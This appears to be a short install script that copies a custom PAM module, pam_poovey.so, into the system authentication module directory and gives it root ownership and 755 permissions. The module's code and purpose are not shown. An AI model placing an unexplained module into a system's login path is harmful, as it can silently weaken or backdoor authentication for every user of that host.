#!/bin/sh

cp pam_poovey.so /lib/x86_64-linux-gnu/security/
chown root:root /lib/x86_64-linux-gnu/security/pam_poovey.so
chmod 755 /lib/x86_64-linux-gnu/security/pam_poovey.so
